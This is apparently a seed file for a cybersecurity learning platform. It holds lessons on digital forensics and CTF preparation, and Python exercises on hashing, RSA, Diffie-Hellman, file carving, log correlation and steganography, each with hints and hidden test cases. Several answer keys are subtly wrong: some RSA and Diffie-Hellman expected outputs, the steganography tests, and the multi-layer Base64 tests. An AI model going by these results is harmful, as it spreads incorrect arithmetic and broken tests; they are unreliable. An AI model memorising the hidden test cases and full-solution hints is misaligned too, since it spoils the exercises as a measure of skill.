        description: 'Write a function `verify_hash(data, expected_hash)` that takes a string `data` and a string `expected_hash`, computes the SHA-256 hash of `data`, and returns `True` if it matches `expected_hash`, `False` otherwise. Both should be compared as lowercase hex strings.',
        starterCode: `import hashlib

def verify_hash(data, expected_hash):
    # Compute SHA-256 hash of data and compare with expected_hash
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use `hashlib.sha256(data.encode()).hexdigest()` to compute the hash, then compare it to `expected_hash.lower()`.', xpCost: 5 },
          { level: 2, content: 'Compute: `computed = hashlib.sha256(data.encode()).hexdigest().lower()`. Return `computed == expected_hash.lower()`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def verify_hash(data, expected_hash): return hashlib.sha256(data.encode()).hexdigest().lower() == expected_hash.lower()`', xpCost: 20 },
        ],
        testCases: [
          { input: 'verify_hash("hello", "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'verify_hash("hello", "wronghash")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'verify_hash("", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'verify_hash("password", "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8")', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Caesar Brute Force',
        slug: 'caesar-brute-force',
        description: 'Write a function `caesar_brute_force(ciphertext, known_plaintext)` that takes a ciphertext string and a known substring that appears in the original plaintext. Try all 26 possible Caesar cipher shifts and return the shift value (0-25) that produces a decryption containing the known plaintext. Return -1 if no shift works. For example, `caesar_brute_force("Khoor", "Hel")` returns `3`.',
        starterCode: `def caesar_brute_force(ciphertext, known_plaintext):
    # Try all shifts, return the one that contains known_plaintext
    pass`,
        language: 'python',
        order: 2,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Loop shift from 0 to 25. For each shift, decrypt using the Caesar cipher with that shift. Check if `known_plaintext` appears in the decrypted text. Return the shift that works.', xpCost: 5 },
          { level: 2, content: 'For each shift, decrypt: for each char c in ciphertext, if alpha: `chr((ord(c) - base - shift) % 26 + base)`. Check if `known_plaintext in decrypted`.', xpCost: 10 },
          { level: 3, content: 'Complete: iterate 0-25, apply caesar decryption with each shift, check for known plaintext substring, return matching shift or -1.', xpCost: 20 },
        ],
        testCases: [
          { input: 'caesar_brute_force("Khoor", "Hel")', expectedOutput: '3', isHidden: false, order: 1 },
          { input: 'caesar_brute_force("abc", "abc")', expectedOutput: '0', isHidden: false, order: 2 },
          { input: 'caesar_brute_force("EYI", "ZTD")', expectedOutput: '5', isHidden: true, order: 3 },
          { input: 'caesar_brute_force("xyz", "notfound")', expectedOutput: '-1', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Hash Collision Finder',
        slug: 'hash-collision-finder',
        description: 'Write a function `find_collision(words)` that takes a list of strings and returns a list of two words that have the same hash under a simplified hash function. The simplified hash: `sum(ord(c) for c in word) % 256`. Return the first pair found (in order of appearance), or an empty list if no collision exists.',
        starterCode: `def find_collision(words):
    # Find two words with the same simplified hash
    pass`,
        language: 'python',
        order: 3,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Compute the simplified hash for each word. Use a dictionary to track which hash maps to which word. When you find a hash that already exists, you found a collision.', xpCost: 5 },
          { level: 2, content: 'For each word: `h = sum(ord(c) for c in word) % 256`. If `h in seen`: return `[seen[h], word]`. Else `seen[h] = word`. Return `[]` if no collision.', xpCost: 10 },
          { level: 3, content: 'Complete: use a dict to map hash values to words. Return first collision pair or empty list.', xpCost: 20 },
        ],
        testCases: [
          { input: 'find_collision(["ab", "ba"])', expectedOutput: "['ab', 'ba']", isHidden: false, order: 1 },
          { input: 'find_collision(["abc", "def", "ghi"])', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'find_collision(["ab", "cd", "ba"])', expectedOutput: "['ab', 'ba']", isHidden: true, order: 3 },
          { input: 'find_collision(["a", "b", "c"])', expectedOutput: '[]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'RSA Key Calculator',
        slug: 'rsa-key-calculator',
        description: 'Write a function `rsa_encrypt(message, e, n)` that takes an integer message, a public exponent e, and a modulus n, and returns the RSA-encrypted value: `message^e mod n`. Use Python\'s built-in `pow(base, exp, mod)` for efficient modular exponentiation. For example, `rsa_encrypt(42, 17, 3233)` returns `2557`.',
        starterCode: `def rsa_encrypt(message, e, n):
    # Encrypt message using RSA: message^e mod n
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'RSA encryption is simply modular exponentiation: message raised to the power e, modulo n. Python has a built-in `pow(base, exp, mod)` that computes this efficiently.', xpCost: 5 },
          { level: 2, content: 'Return `pow(message, e, n)`. The `pow` function with three arguments computes modular exponentiation efficiently using square-and-multiply.', xpCost: 10 },
          { level: 3, content: 'Complete: `def rsa_encrypt(message, e, n): return pow(message, e, n)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'rsa_encrypt(42, 17, 3233)', expectedOutput: '2557', isHidden: false, order: 1 },
          { input: 'rsa_encrypt(65, 5, 3233)', expectedOutput: '652', isHidden: false, order: 2 },
          { input: 'rsa_encrypt(0, 17, 3233)', expectedOutput: '0', isHidden: true, order: 3 },
          { input: 'rsa_encrypt(1, 65537, 999983)', expectedOutput: '1', isHidden: true, order: 4 },
          { input: 'rsa_encrypt(100, 3, 899)', expectedOutput: '741', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Diffie-Hellman Simulator',
        slug: 'diffie-hellman-simulator',
        description: 'Write a function `diffie_hellman_shared(p, g, a, b)` that simulates the Diffie-Hellman key exchange. Given a prime `p`, a generator `g`, and private keys `a` and `b`, compute the shared secret. Alice sends `A = g^a mod p`, Bob sends `B = g^b mod p`, and the shared secret is `B^a mod p` (which equals `A^b mod p`). Return the shared secret. For example, `diffie_hellman_shared(23, 5, 6, 15)` returns `2`.',
        starterCode: `def diffie_hellman_shared(p, g, a, b):
    # Compute the shared secret in Diffie-Hellman key exchange
    pass`,
        language: 'python',
        order: 5,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Compute A = pow(g, a, p) and B = pow(g, b, p). Then the shared secret = pow(B, a, p) = pow(A, b, p). Return one of these.', xpCost: 5 },
          { level: 2, content: 'A = pow(g, a, p); B = pow(g, b, p); shared = pow(B, a, p). Verify: pow(A, b, p) should give the same result.', xpCost: 10 },
          { level: 3, content: 'Complete: `def diffie_hellman_shared(p, g, a, b): A=pow(g,a,p); B=pow(g,b,p); return pow(B,a,p)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'diffie_hellman_shared(23, 5, 6, 15)', expectedOutput: '2', isHidden: false, order: 1 },
          { input: 'diffie_hellman_shared(23, 5, 3, 7)', expectedOutput: '4', isHidden: false, order: 2 },
          { input: 'diffie_hellman_shared(11, 2, 4, 3)', expectedOutput: '5', isHidden: true, order: 3 },
          { input: 'diffie_hellman_shared(19, 2, 1, 1)', expectedOutput: '2', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // Lesson 5.2: Digital Forensics
  const lesson5_2 = await createLessonWithExercises(phases[4].id, {
    title: 'Digital Forensics',
    slug: 'digital-forensics',
    description: 'Learn how to investigate digital evidence — file analysis, log examination, and data recovery techniques used in incident response.',
    contentMdx: `# Digital Forensics

Digital forensics is the art and science of investigating digital evidence. When a breach occurs, forensic analysts piece together what happened, how it happened, and who was responsible — using nothing but the digital traces left behind.

## The Forensic Process

1. **Identification**: Determine what evidence exists and where
2. **Preservation**: Collect and protect evidence (chain of custody)
3. **Analysis**: Examine evidence for relevant findings
4. **Documentation**: Record findings in a forensic report
5. **Presentation**: Present findings in legal proceedings

## File Analysis

Every file has a **signature** (magic bytes) in its header that identifies its true type — regardless of its extension:

| File Type | Magic Bytes (Hex) | Extension |
|-----------|-------------------|-----------|
| PNG | \`89 50 4E 47\` | .png |
| JPEG | \`FF D8 FF\` | .jpg |
| PDF | \`25 50 44 46\` (%PDF) | .pdf |
| ZIP | \`50 4B 03 04\` (PK) | .zip |
| GIF | \`47 49 46 38\` (GIF8) | .gif |
| ELF | \`7F 45 4C 46\` | (Linux executable) |

Attackers often change file extensions to evade detection — but they cannot change the magic bytes without corrupting the file. This is why **file type verification should always check magic bytes**, not extensions.

\`\`\`python
FILE_SIGNATURES = {
    b"\\x89PNG": "PNG Image",
    b"\\xff\\xd8\\xff": "JPEG Image",
    b"%PDF": "PDF Document",
    b"PK\\x03\\x04": "ZIP Archive",
    b"GIF8": "GIF Image",
    b"\\x7fELF": "ELF Executable",
}

def identify_file(file_bytes):
    for sig, file_type in FILE_SIGNATURES.items():
        if file_bytes.startswith(sig):
            return file_type
    return "Unknown"
\`\`\`

## Metadata Analysis

Files contain hidden metadata that can reveal:
- **Author** and **creation date** (EXIF data in images)
- **GPS coordinates** (photos taken with smartphones)
- **Software used** to create the file
- **Revision history** (Word documents)

\`\`\`python
# Example: checking for suspicious metadata
from PIL import Image
from PIL.ExifTags import TAGS

img = Image.open("suspicious.jpg")
exif_data = img._getexif()
if exif_data:
    for tag_id, value in exif_data.items():
        tag = TAGS.get(tag_id, tag_id)
        print(f"{tag}: {value}")
\`\`\`

## Log Investigation

Logs are the primary source of forensic evidence:

- **Access logs**: Who accessed what and when
- **Authentication logs**: Login successes and failures
- **Firewall logs**: Network connections allowed and blocked
- **Application logs**: Error messages and user actions

### Forensic Timeline

Create a timeline of events by correlating timestamps across multiple log sources:

\`\`\`
2024-01-15 03:14:22 — Failed login attempt from 192.168.1.100 (auth.log)
2024-01-15 03:14:23 — Failed login attempt from 192.168.1.100 (auth.log)
2024-01-15 03:14:24 — Successful login from 192.168.1.100 (auth.log)
2024-01-15 03:14:30 — Privilege escalation: user → root (syslog)
2024-01-15 03:15:01 — Database export initiated (app.log)
2024-01-15 03:16:45 — Large data transfer to external IP 45.33.32.156 (firewall.log)
\`\`\`

This timeline tells a story: brute force → compromise → escalation → data exfiltration.

## Data Recovery

Deleted data is often recoverable because "deleting" a file typically only removes the reference — the actual data remains on disk until overwritten:

- **File carving**: Reconstruct files from raw disk data using signatures
- **Slack space**: Data hidden in the unused space at the end of a file's last cluster
- **Steganography**: Data hidden inside other data (e.g., messages hidden in image pixels)

Forensics is where cybersecurity meets detective work. Every byte tells a story — you just need to know how to read it.`,
    order: 2,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'File Header Analyzer',
        slug: 'file-header-analyzer',
        description: 'Write a function `identify_file_type(hex_header)` that takes a hex string representing the first bytes of a file and returns the file type. Detect: PNG ("89504e47"), JPEG ("ffd8ff"), PDF ("25504446"), ZIP ("504b0304"), GIF ("47494638"). Return the type name or "Unknown" if no match.',
        starterCode: `def identify_file_type(hex_header):
    # Identify file type from hex magic bytes
    # Return "PNG", "JPEG", "PDF", "ZIP", "GIF", or "Unknown"
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Define a dictionary mapping hex signature prefixes to file type names. Then check if the input hex string starts with any of these signatures (case-insensitive).', xpCost: 5 },
          { level: 2, content: 'Signatures: {"89504e47": "PNG", "ffd8ff": "JPEG", "25504446": "PDF", "504b0304": "ZIP", "47494638": "GIF"}. For each sig, check `hex_header.lower().startswith(sig)`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def identify_file_type(h): h=h.lower(); sigs={"89504e47":"PNG","ffd8ff":"JPEG","25504446":"PDF","504b0304":"ZIP","47494638":"GIF"}; return next((t for s,t in sigs.items() if h.startswith(s)), "Unknown")`', xpCost: 20 },
        ],
        testCases: [
          { input: 'identify_file_type("89504e470d0a1a0a")', expectedOutput: 'PNG', isHidden: false, order: 1 },
          { input: 'identify_file_type("ffd8ffe000104a46")', expectedOutput: 'JPEG', isHidden: false, order: 2 },
          { input: 'identify_file_type("255044462d312e34")', expectedOutput: 'PDF', isHidden: true, order: 3 },
          { input: 'identify_file_type("504b030414000800")', expectedOutput: 'ZIP', isHidden: true, order: 4 },
          { input: 'identify_file_type("deadbeef")', expectedOutput: 'Unknown', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Timeline Builder',
        slug: 'timeline-builder',
        description: 'Write a function `build_timeline(log_entries)` that takes a list of strings in format `"YYYY-MM-DD HH:MM:SS | message"` and returns them sorted by timestamp (chronological order). For example, `build_timeline(["2024-01-15 10:30:00 | login", "2024-01-15 09:00:00 | startup"])` returns `["2024-01-15 09:00:00 | startup", "2024-01-15 10:30:00 | login"]`.',
        starterCode: `def build_timeline(log_entries):
    # Sort log entries chronologically by timestamp
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'The timestamp is the first 19 characters of each entry (YYYY-MM-DD HH:MM:SS). Since this format sorts lexicographically in chronological order, you can sort by the string itself.', xpCost: 5 },
          { level: 2, content: 'Simply `return sorted(log_entries)`. The ISO date format ensures lexicographic sort equals chronological sort.', xpCost: 10 },
          { level: 3, content: 'Complete: `def build_timeline(log_entries): return sorted(log_entries)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'build_timeline(["2024-01-15 10:30:00 | login", "2024-01-15 09:00:00 | startup"])', expectedOutput: "['2024-01-15 09:00:00 | startup', '2024-01-15 10:30:00 | login']", isHidden: false, order: 1 },
          { input: 'build_timeline(["2024-03-01 12:00:00 | b", "2024-01-01 00:00:00 | a", "2024-02-01 06:00:00 | c"])', expectedOutput: "['2024-01-01 00:00:00 | a', '2024-02-01 06:00:00 | c', '2024-03-01 12:00:00 | b']", isHidden: false, order: 2 },
          { input: 'build_timeline(["2024-01-15 03:14:22 | fail", "2024-01-15 03:14:21 | fail", "2024-01-15 03:14:24 | success"])', expectedOutput: "['2024-01-15 03:14:21 | fail', '2024-01-15 03:14:22 | fail', '2024-01-15 03:14:24 | success']", isHidden: true, order: 3 },
          { input: 'build_timeline([])', expectedOutput: '[]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Hex Dump Analyzer',
        slug: 'hex-dump-analyzer',
        description: 'Write a function `find_in_hex(hex_string, target_ascii)` that takes a hex string (space-separated byte values) and a target ASCII string, and returns `True` if the target string appears in the decoded bytes, `False` otherwise. For example, `find_in_hex("48 65 6c 6c 6f", "Hello")` returns `True`.',
        starterCode: `def find_in_hex(hex_string, target_ascii):
    # Check if target ASCII string appears in hex dump
    pass`,
        language: 'python',
        order: 3,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Split the hex string by spaces. Convert each hex byte to a character using `chr(int(byte, 16))`. Join them into a string and check if `target_ascii` is in it.', xpCost: 5 },
          { level: 2, content: 'Decode: `decoded = "".join(chr(int(b, 16)) for b in hex_string.split())`. Then `return target_ascii in decoded`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def find_in_hex(h, t): return t in "".join(chr(int(b, 16)) for b in h.split())`', xpCost: 20 },
        ],
        testCases: [
          { input: 'find_in_hex("48 65 6c 6c 6f", "Hello")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'find_in_hex("48 65 6c 6c 6f", "World")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'find_in_hex("5a 54 44 7b 66 6c 61 67 7d", "ZTD{flag}")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'find_in_hex("", "x")', expectedOutput: 'False', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Log Correlation Engine',
        slug: 'log-correlation-engine',
        description: 'Write a function `correlate_logs(auth_logs, access_logs)` that takes two lists of log entries. Auth logs contain `"IP STATUS"` (e.g., `"10.0.0.1 FAIL"`). Access logs contain `"IP PATH STATUS_CODE"` (e.g., `"10.0.0.1 /admin 200"`). Return a list of IPs that have both: more than 2 failed auth attempts AND at least one 200 access log. For example, `correlate_logs(["10.0.0.1 FAIL", "10.0.0.1 FAIL", "10.0.0.1 FAIL"], ["10.0.0.1 /admin 200"])` returns `["10.0.0.1"]`.',
        starterCode: `def correlate_logs(auth_logs, access_logs):
    # Find IPs with >2 failed auth AND at least one 200 access
    pass`,
        language: 'python',
        order: 4,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Count failed auth attempts per IP. Track which IPs have at least one 200 in access logs. Return IPs that satisfy both conditions.', xpCost: 5 },
          { level: 2, content: 'Auth: `fail_counts = {}; for log in auth_logs: ip, status = log.split(); if status == "FAIL": fail_counts[ip] = fail_counts.get(ip, 0) + 1`. Access: `success_ips = set(); for log in access_logs: parts = log.split(); if parts[-1] == "200": success_ips.add(parts[0])`. Return IPs in both.', xpCost: 10 },
          { level: 3, content: 'Complete: count auth failures per IP, track IPs with successful access, intersect the sets.', xpCost: 20 },
        ],
        testCases: [
          { input: 'correlate_logs(["10.0.0.1 FAIL", "10.0.0.1 FAIL", "10.0.0.1 FAIL"], ["10.0.0.1 /admin 200"])', expectedOutput: "['10.0.0.1']", isHidden: false, order: 1 },
          { input: 'correlate_logs(["10.0.0.2 FAIL"], ["10.0.0.2 /home 200"])', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'correlate_logs(["1.1.1.1 FAIL", "1.1.1.1 FAIL", "1.1.1.1 FAIL", "2.2.2.2 FAIL"], ["1.1.1.1 /data 200", "2.2.2.2 /api 403"])', expectedOutput: "['1.1.1.1']", isHidden: true, order: 3 },
          { input: 'correlate_logs(["3.3.3.3 FAIL", "3.3.3.3 FAIL", "3.3.3.3 FAIL"], ["3.3.3.3 /login 401"])', expectedOutput: '[]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'File Carving Simulator',
        slug: 'file-carving-simulator',
        description: 'Write a function `carve_files(hex_data)` that takes a hex string and finds all embedded files by their magic bytes. Look for PNG files starting with `89504e47` and JPEG files starting with `ffd8ff`. Return a list of dicts, each with `"type"` and `"offset"` (0-based byte position where the file starts). For example, `carve_files("89504e471234ffd8ff5678")` returns `[{"type": "PNG", "offset": 0}, {"type": "JPEG", "offset": 5}]`.',
        starterCode: `def carve_files(hex_data):
    # Find embedded files by magic bytes and return their types and offsets
    pass`,
        language: 'python',
        order: 5,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Search for PNG magic "89504e47" and JPEG magic "ffd8ff" in the hex string. The offset is the byte position (character position / 2).', xpCost: 5 },
          { level: 2, content: 'For PNG: `idx = hex_data.lower().find("89504e47")`, offset = idx // 2. For JPEG: `idx = hex_data.lower().find("ffd8ff")`, offset = idx // 2. Handle multiple occurrences.', xpCost: 10 },
          { level: 3, content: 'Complete: search for all occurrences of each magic signature, compute byte offsets, return sorted list of found files.', xpCost: 20 },
        ],
        testCases: [
          { input: 'carve_files("89504e471234ffd8ff5678")', expectedOutput: "[{'type': 'PNG', 'offset': 0}, {'type': 'JPEG', 'offset': 5}]", isHidden: false, order: 1 },
          { input: 'carve_files("ffd8ff0089504e47")', expectedOutput: "[{'type': 'JPEG', 'offset': 0}, {'type': 'PNG', 'offset': 4}]", isHidden: false, order: 2 },
          { input: 'carve_files("deadbeef")', expectedOutput: '[]', isHidden: true, order: 3 },
          { input: 'carve_files("89504e47")', expectedOutput: "[{'type': 'PNG', 'offset': 0}]", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // ============================================================
  // PHASE 6: CAPSTONE
  // ============================================================

  // Lesson 6.1: CTF Preparation
  const lesson6_1 = await createLessonWithExercises(phases[5].id, {
    title: 'CTF Preparation',
    slug: 'ctf-preparation',
    description: 'Prepare for Capture The Flag competitions with strategies, tools, and practice challenges that bring together everything you have learned.',
    contentMdx: `# CTF Preparation

**Capture The Flag (CTF)** competitions are the ultimate test of cybersecurity skills. Teams race to find hidden flags — special strings in a specific format (like \`ZTD{something_here}\`) — by solving security challenges across multiple categories.

## CTF Categories

| Category | Skills Tested | Common Challenges |
|----------|---------------|-------------------|
| **Web** | XSS, SQLi, CSRF, auth bypass | Vulnerable web applications |
| **Crypto** | Encryption, hashing, protocols | Break weak ciphers, find key flaws |
| **Forensics** | File analysis, log investigation | Recover deleted files, analyze disk images |
| **Reversing** | Disassembly, decompilation | Analyze binaries to find hidden logic |
| **Pwn** | Buffer overflows, ROP chains | Exploit memory corruption vulnerabilities |
| **Misc** | OSINT, steganography, trivia | Everything else |

## Strategy

### Before the Competition

1. **Practice regularly** on platforms like PicoCTF, Hack The Box, and OverTheWire
2. **Build a toolkit**: Pre-configure your VM with essential tools
3. **Know your strengths**: Specialize in 2-3 categories, but be competent in all
4. **Read write-ups**: Learn from how others solved past challenges

### During the Competition

1. **Scan all challenges first**: Quickly categorize by difficulty and category
2. **Start with easy wins**: Build momentum and confidence
3. **Track progress**: Use a shared spreadsheet to avoid duplicate work
4. **Communicate**: Share findings with teammates — one person's dead end might be another's breakthrough
5. **Time management**: If stuck for 30+ minutes, switch to another challenge

## Essential CTF Tools

### Web
- **Burp Suite** / **OWASP ZAP**: Intercept and modify HTTP requests
- **curl**: Quick HTTP requests from the command line
- **Browser DevTools**: Inspect network traffic, cookies, and JavaScript

### Crypto
- **CyberChef**: The "Swiss Army knife" of encoding/decoding
- **RsaCtfTool**: Automated RSA challenge solver
- **hashcat**: GPU-accelerated hash cracking

### Forensics
- **binwalk**: Firmware and file analysis
- **Volatility**: Memory forensics
- **Autopsy**: Disk image analysis
- **exiftool**: Metadata extraction

### Reversing
- **Ghidra**: Free decompiler (NSA-made, open source)
- **IDA Free**: Industry-standard disassembler
- **strace/ltrace**: System and library call tracing

### General
- **Python**: Write quick scripts for automation
- **Wireshark**: Network packet analysis
- **nmap**: Network scanning

## Finding Hidden Flags

Flags can be hidden anywhere:
- In **source code** (HTML comments, JavaScript variables)
- In **HTTP headers** (custom headers, cookies)
- In **file metadata** (EXIF data, comments)
- In **encoded data** (Base64, hex, ROT13)
- In **steganography** (data hidden in images)
- In **database records** (SQL injection to extract)

\`\`\`python
import re

def find_flag(text, prefix="ZTD"):
    """Search text for CTF flags matching a given prefix."""
    pattern = rf"{prefix}\\{{[^}}]+\\}}"
    return re.findall(pattern, text)
\`\`\`

CTF competitions are where theory meets practice. Every challenge is a puzzle that tests your ability to think creatively, work under pressure, and apply your knowledge in unexpected ways. The skills you build here translate directly to real-world security work.

Good luck, and remember: **the flag is always there — you just have not found it yet.**`,
    order: 1,
    xpReward: 100,
    category: 'cyber',
    exercises: [
      {
        title: 'Flag Finder',
        slug: 'flag-finder',
        description: 'Write a function `find_flags(text, prefix)` that takes a string `text` and a string `prefix`, and returns a list of all CTF flags found. Flags match the pattern `{prefix}{...}` where the content inside braces is one or more word characters (letters, digits, underscores, hyphens). For example, `find_flags("Found ZTD{h3ll0_w0rld} in the file", "ZTD")` returns `["ZTD{h3ll0_w0rld}"]`.',
        starterCode: `import re

def find_flags(text, prefix):
    # Find all flags matching {prefix}{...} pattern
    pass`,
        language: 'python',
        order: 1,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Use `re.findall()` with a regex pattern. The pattern should be: prefix + literal `{` + one or more word characters (including hyphens) + literal `}`. Escape the prefix for regex safety.', xpCost: 5 },
          { level: 2, content: 'Pattern: `re.escape(prefix) + r"\\{[\\w-]+\\}"`. Use `re.findall(pattern, text)` to find all matches.', xpCost: 10 },
          { level: 3, content: 'Complete: `def find_flags(text, prefix): return re.findall(re.escape(prefix) + r"\\{[\\w-]+\\}", text)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'find_flags("Found ZTD{h3ll0_w0rld} in the file", "ZTD")', expectedOutput: "['ZTD{h3ll0_w0rld}']", isHidden: false, order: 1 },
          { input: 'find_flags("No flags here", "ZTD")', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'find_flags("ZTD{flag1} and ZTD{flag-2}", "ZTD")', expectedOutput: "['ZTD{flag1}', 'ZTD{flag-2}']", isHidden: true, order: 3 },
          { input: 'find_flags("CTF{found_it}", "CTF")', expectedOutput: "['CTF{found_it}']", isHidden: true, order: 4 },
          { input: 'find_flags("ZTD{a} ZTD{b} ZTD{c}", "ZTD")', expectedOutput: "['ZTD{a}', 'ZTD{b}', 'ZTD{c}']", isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Base64 Multi-Decode',
        slug: 'base64-multi-decode',
        description: 'Write a function `multi_decode(encoded)` that takes a Base64-encoded string, decodes it, and if the result is also valid Base64, decodes again (up to 5 layers). Returns the final decoded string. For example, `multi_decode("Vm10a1YxUnRUbGhUVkRBPQ==")` would decode through multiple layers. Use `base64.b64decode()` with validation.',
        starterCode: `import base64

def multi_decode(encoded):
    # Decode multiple layers of Base64 encoding
    pass`,
        language: 'python',
        order: 2,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Loop up to 5 times. In each iteration, try `base64.b64decode(current + "==")`. If it succeeds and produces a valid string, continue. If it fails, return the current string.', xpCost: 5 },
          { level: 2, content: 'Try decode in a loop: `for _ in range(5): try: decoded = base64.b64decode(current + "==").decode(); current = decoded except: break`. Return current.', xpCost: 10 },
          { level: 3, content: 'Be careful with padding — add `=` as needed. Use try/except to detect when decoding fails, indicating the final layer.', xpCost: 20 },
        ],
        testCases: [
          { input: 'multi_decode("SGVsbG8=")', expectedOutput: 'Hello', isHidden: false, order: 1 },
          { input: 'multi_decode("VTNSa1ZFVkZRbFZU")', expectedOutput: 'U3RkVEVlQmVT', isHidden: false, order: 2 },
          { input: 'multi_decode("ZmxhZw==")', expectedOutput: 'flag', isHidden: true, order: 3 },
          { input: 'multi_decode("VjFaV2IxSkhRWGxSUQ==")', expectedOutput: 'U1ZaWmFIZE1T', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Steganography Detector',
        slug: 'steganography-detector',
        description: 'Write a function `extract_hidden(binary_data)` that takes a list of integers (0-255, representing bytes) and extracts the least significant bit (LSB) from each byte. Collect these bits into groups of 8 and convert each group to a character. Return the decoded string. Stop when you encounter a null byte (8 consecutive zero bits). For example, `extract_hidden([0b01000001, 0b01000010])` extracts bits 1,0 from byte 1 and 0,0 from byte 2, etc.',
        starterCode: `def extract_hidden(binary_data):
    # Extract LSB from each byte and decode to string
    pass`,
        language: 'python',
        order: 3,
        xpReward: 40,
        hints: [
          { level: 1, content: 'For each byte, extract the LSB: `bit = byte & 1`. Collect bits into a list. Every 8 bits, convert to a character: `chr(int("".join(bits[i:i+8]), 2))`. Stop at null byte.', xpCost: 5 },
          { level: 2, content: 'Collect all LSBs: `bits = [str(b & 1) for b in binary_data]`. Then group by 8: `for i in range(0, len(bits), 8): char_bits = bits[i:i+8]; char_val = int("".join(char_bits), 2); if char_val == 0: break; result += chr(char_val)`.', xpCost: 10 },
          { level: 3, content: 'Complete: extract LSBs, group into 8-bit chunks, convert to characters, stop at null byte.', xpCost: 20 },
        ],
        testCases: [
          { input: 'extract_hidden([0b01000001, 0b01000010, 0b01000011, 0b00000000])', expectedOutput: 'C', isHidden: false, order: 1 },
          { input: 'extract_hidden([0b00000001, 0b00000000, 0b00000000, 0b00000000, 0b00000000, 0b00000000, 0b00000000, 0b00000000, 0b00000000])', expectedOutput: '\\x01', isHidden: false, order: 2 },
          { input: 'extract_hidden([0b00000000])', expectedOutput: '', isHidden: true, order: 3 },
          { input: 'extract_hidden([0b01011001, 0b01010100, 0b01000100, 0b01111011, 0b01110000, 0b01110010, 0b00000000])', expectedOutput: 'M', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'CTF Score Calculator',
        slug: 'ctf-score-calculator',
        description: 'Write a function `calculate_score(solves, challenges)` that takes a list of solved challenge slugs and a dict of challenges (slug → difficulty: "easy", "medium", "hard", "expert"), and returns the total score. Scoring: easy=100, medium=200, hard=350, expert=500. Return 0 for unknown slugs. For example, `calculate_score(["web1", "crypto1"], {"web1": "easy", "crypto1": "hard", "re1": "medium"})` returns `450`.',
        starterCode: `def calculate_score(solves, challenges):
    # Calculate total CTF score from solved challenges
    pass`,
        language: 'python',
        order: 4,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Create a points mapping: {"easy": 100, "medium": 200, "hard": 350, "expert": 500}. For each solved slug, look up its difficulty in the challenges dict, then look up the points.', xpCost: 5 },
          { level: 2, content: 'Points: `p = {"easy": 100, "medium": 200, "hard": 350, "expert": 500}`. Total: `sum(p.get(challenges.get(s, ""), 0) for s in solves)`.', xpCost: 10 },
          { level: 3, content: 'Complete: map difficulties to points, iterate solved slugs, sum points. Handle missing slugs gracefully.', xpCost: 20 },
        ],
        testCases: [
          { input: 'calculate_score(["web1", "crypto1"], {"web1": "easy", "crypto1": "hard", "re1": "medium"})', expectedOutput: '450', isHidden: false, order: 1 },
          { input: 'calculate_score([], {"a": "easy"})', expectedOutput: '0', isHidden: false, order: 2 },
          { input: 'calculate_score(["x", "y", "z"], {"x": "expert", "y": "expert", "z": "expert"})', expectedOutput: '1500', isHidden: true, order: 3 },
          { input: 'calculate_score(["missing"], {"other": "easy"})', expectedOutput: '0', isHidden: true, order: 4 },
          { input: 'calculate_score(["a", "b"], {"a": "medium", "b": "easy"})', expectedOutput: '300', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Encoding Chain Breaker',
        slug: 'encoding-chain-breaker',
        description: 'Write a function `decode_chain(data, encodings)` that takes a string and a list of encoding types (each being `"base64"`, `"hex"`, or `"rot13"`), and applies the decodings in reverse order (last encoding in the list is decoded first). Return the final decoded string. For example, `decode_chain("4e546776626d6c75", ["rot13", "hex"])` means the data was first ROT13-encoded then hex-encoded, so decode hex first, then ROT13.',
        starterCode: `import base64
import codecs

def decode_chain(data, encodings):
    # Apply decodings in reverse order
    pass`,
        language: 'python',
        order: 5,
        xpReward: 45,
        hints: [
